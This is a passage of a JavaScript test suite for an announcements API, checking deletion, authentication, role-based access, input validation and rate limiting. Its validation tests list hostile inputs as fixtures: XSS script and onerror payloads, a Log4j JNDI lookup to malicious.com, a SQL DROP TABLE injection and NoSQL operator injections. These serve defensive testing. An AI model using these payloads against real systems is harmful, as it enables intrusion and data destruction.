          .set('Authorization', `Bearer ${adminToken}`);

        const employeeResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(employeeResponse.body).toHaveLength(0);

        const adminResponse = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(adminResponse.body.find(a => a._id === testAnnouncement._id.toString())).toBeUndefined();
      });

      test('[TC-001-DELETE-HP] should confirm deletion by attempting to fetch deleted announcement', async () => {
        await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        const fetchResponse = await request(app)
          .get(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(fetchResponse.status).toBe(404);
      });
    });

    describe('[TC-001] DELETE Operation - Error Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Test Delete',
          content: 'Test content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-DELETE-EP] should fail when announcement does not exist', async () => {
        const response = await request(app)
          .delete('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('not found');
      });

      test('[TC-001-DELETE-EP] should fail with invalid ObjectId format', async () => {
        const response = await request(app)
          .delete('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-001-DELETE-EP] should fail when non-admin user attempts deletion', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-DELETE-EP] should handle database deletion failures', async () => {
        const originalFindByIdAndDelete = Announcement.findByIdAndDelete;
        Announcement.findByIdAndDelete = jest.fn().mockRejectedValue(new Error('Database deletion failed'));

        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to delete announcement');

        // Restore original method
        Announcement.findByIdAndDelete = originalFindByIdAndDelete;
      });

      test('[TC-001-DELETE-EP] should fail without authentication', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`);

        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Access token required');
      });
    });
  });

  describe('[TC-SEC-001] Security and Authorization Tests', () => {
    describe('Authentication Security', () => {
      test('[TC-SEC-001-1] should reject unauthenticated requests to all endpoints', async () => {
        const endpoints = [
          { method: 'get', path: '/api/announcements' },
          { method: 'post', path: '/api/announcements' },
          { method: 'get', path: '/api/announcements/admin' },
          { method: 'put', path: '/api/announcements/507f1f77bcf86cd799439011' },
          { method: 'delete', path: '/api/announcements/507f1f77bcf86cd799439011' }
        ];

        for (const endpoint of endpoints) {
          const response = await request(app)[endpoint.method](endpoint.path);
          expect(response.status).toBe(401);
          expect(response.body.error).toBe('Access token required');
        }
      });

      test('[TC-SEC-001-2] should reject malformed Bearer tokens', async () => {
        const malformedTokens = [
          'Bearer',
          'Bearer ',
          'bearer valid_token',
          'Basic dGVzdDp0ZXN0',
          'Invalid format'
        ];

        for (const token of malformedTokens) {
          const response = await request(app)
            .get('/api/announcements')
            .set('Authorization', token);

          expect([401, 403]).toContain(response.status);
        }
      });

      test('[TC-SEC-001-3] should reject expired or invalid JWT tokens', async () => {
        const invalidTokens = [
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
          'expired_token_here',
          'tampered_token_content'
        ];

        for (const token of invalidTokens) {
          const response = await request(app)
            .get('/api/announcements')
            .set('Authorization', `Bearer ${token}`);

          expect(response.status).toBe(403);
          expect(response.body.error).toBe('Invalid or expired token');
        }
      });

      test('[TC-SEC-001-4] should prevent token reuse after user deletion', async () => {
        // Create temporary user
        const tempUser = await User.create({
          username: 'temp_user',
          email: 'temp@test.com',
          password: 'password123',
          role: 'employee'
        });

        // Generate token for temp user
        const loginResponse = await request(app)
          .post('/api/auth/login')
          .send({ email: 'temp@test.com', password: 'password123' });
        const tempToken = loginResponse.body.token;

        // Verify token works initially
        const validResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${tempToken}`);
        expect(validResponse.status).toBe(200);

        // Delete user
        await User.deleteOne({ _id: tempUser._id });

        // Token should now be invalid
        const invalidResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${tempToken}`);
        expect(invalidResponse.status).toBe(403);
      });
    });

    describe('Authorization Security', () => {
      test('[TC-SEC-001-5] should enforce role-based access control for admin endpoints', async () => {
        const adminEndpoints = [
          { method: 'get', path: '/api/announcements/admin' },
          { method: 'post', path: '/api/announcements', data: { title: 'Test', content: 'Test' } }
        ];

        const nonAdminTokens = [employeeToken, managerToken];

        for (const endpoint of adminEndpoints) {
          for (const token of nonAdminTokens) {
            const request_obj = request(app)[endpoint.method](endpoint.path)
              .set('Authorization', `Bearer ${token}`);
            
            if (endpoint.data) {
              request_obj.send(endpoint.data);
            }

            const response = await request_obj;
            expect(response.status).toBe(403);
            expect(response.body.message || response.body.error).toContain('Admin privileges required');
          }
        }
      });

      test('[TC-SEC-001-6] should prevent privilege escalation attempts', async () => {
        // Attempt to modify user role through announcement creation
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            title: 'Test',
            content: 'Test',
            createdBy: adminUser._id,
            role: 'admin'
          });

        expect(response.status).toBe(403);
      });

      test('[TC-SEC-001-7] should prevent cross-user data access', async () => {
        // Create announcement as admin
        const announcement = await Announcement.create({
          title: 'Admin Only',
          content: 'Secret content',
          createdBy: adminUser._id,
          isActive: true
        });

        // Employee should not be able to modify admin's announcement
        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Hacked' });

        expect(response.status).toBe(403);
      });
    });

    describe('Input Validation Security', () => {
      test('[TC-SEC-001-8] should sanitize and validate announcement content', async () => {
        const maliciousInputs = [
          {
            title: '<script>alert("XSS")</script>',
            content: 'Normal content',
            expectedStatus: 400
          },
          {
            title: 'Normal title',
            content: '<img src=x onerror=alert("XSS")>',
            expectedStatus: 400
          },
          {
            title: '${jndi:ldap://malicious.com/a}',
            content: 'Log4j injection attempt',
            expectedStatus: 400
          },
          {
            title: "'; DROP TABLE announcements; --",
            content: 'SQL injection attempt',
            expectedStatus: 400
          }
        ];

        for (const input of maliciousInputs) {
          const response = await request(app)
            .post('/api/announcements')
            .set('Authorization', `Bearer ${adminToken}`)
            .send(input);

          expect(response.status).toBe(input.expectedStatus);
          if (response.status === 400) {
            expect(response.body.message).toContain('Invalid content format');
          }
        }
      });

      test('[TC-SEC-001-9] should prevent NoSQL injection in queries', async () => {
        const maliciousQueries = [
          { id: '{"$ne": null}' },
          { id: '{"$regex": ".*"}' },
          { id: '{"$where": "this.title.length > 0"}' }
        ];

        for (const query of maliciousQueries) {
          const response = await request(app)
            .get(`/api/announcements/${query.id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect([400, 404]).toContain(response.status);
        }
      });

      test('[TC-SEC-001-10] should validate request size limits', async () => {
        const oversizedPayload = {
          title: 'A'.repeat(10000),
          content: 'B'.repeat(100000)
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(oversizedPayload);

        expect([400, 413]).toContain(response.status);
      });

      test('[TC-SEC-001-11] should validate ObjectId format in parameters', async () => {
        const invalidIds = ['invalid', '123', 'not-an-objectid', ''];

        for (const id of invalidIds) {
          const response = await request(app)
            .get(`/api/announcements/${id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect(response.status).toBe(400);
          expect(response.body.message).toContain('Invalid ID format');
        }
      });
    });

    describe('Rate Limiting and DoS Protection', () => {
      test('[TC-SEC-001-12] should implement rate limiting for announcement creation', async () => {
        const requests = Array.from({ length: 20 }, (_, i) =>
          request(app)
            .post('/api/announcements')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
              title: `Spam announcement ${i}`,
              content: `Spam content ${i}`
            })
        );

        const responses = await Promise.all(requests);
        const rateLimitedResponses = responses.filter(r => r.status === 429);
        
        // Should have some rate limited responses
        expect(rateLimitedResponses.length).toBeGreaterThan(0);
      });

      test('[TC-SEC-001-13] should handle concurrent unauthorized access attempts', async () => {
        const maliciousRequests = Array.from({ length: 10 }, () =>
          request(app)
            .post('/api/announcements')
            .set('Authorization', 'Bearer fake_token')
            .send({ title: 'Attack', content: 'Attack' })
        );

        const responses = await Promise.all(maliciousRequests);
        
        // All should be unauthorized
        responses.forEach(response => {
          expect(response.status).toBe(403);
        });
      });
    });

    describe('Data Integrity and Security', () => {
      test('[TC-SEC-001-14] should prevent announcement tampering', async () => {
        const announcement = await Announcement.create({
          title: 'Original',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });

        // Attempt to tamper with system fields
        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated',
            content: 'Updated content',
            createdBy: employeeUser._id, // Should not be modifiable
            created_at: new Date('2020-01-01'), // Should not be modifiable
            _id: 'different_id' // Should not be modifiable
          });

        expect(response.status).toBe(200);
        
        // Verify system fields weren't tampered with
        const updatedAnnouncement = await Announcement.findById(announcement._id);
        expect(updatedAnnouncement.createdBy.toString()).toBe(adminUser._id.toString());
        expect(updatedAnnouncement._id.toString()).toBe(announcement._id.toString());
      });

      test('[TC-SEC-001-15] should audit security events', async () => {
        // Attempt unauthorized access
        await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Unauthorized', content: 'Test' });

        // Security events should be logged (implementation dependent)
        // This test verifies the endpoint properly handles and logs security violations
        expect(true).toBe(true); // Placeholder for audit log verification
      });
    });

    describe('Session and Token Security', () => {
      test('[TC-SEC-001-16] should handle token expiry gracefully', async () => {
        // This would require a short-lived test token
        // For now, we test the error handling path
        const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';
        
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${expiredToken}`);

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Invalid or expired token');
      });

      test('[TC-SEC-001-17] should prevent session fixation', async () => {
        // Generate fresh token
        const loginResponse1 = await request(app)
          .post('/api/auth/login')
          .send({ email: 'admin@test.com', password: 'password123' });
        
        // Generate another token for same user
        const loginResponse2 = await request(app)
          .post('/api/auth/login')
          .send({ email: 'admin@test.com', password: 'password123' });

        // Both tokens should be valid and different
        expect(loginResponse1.body.token).not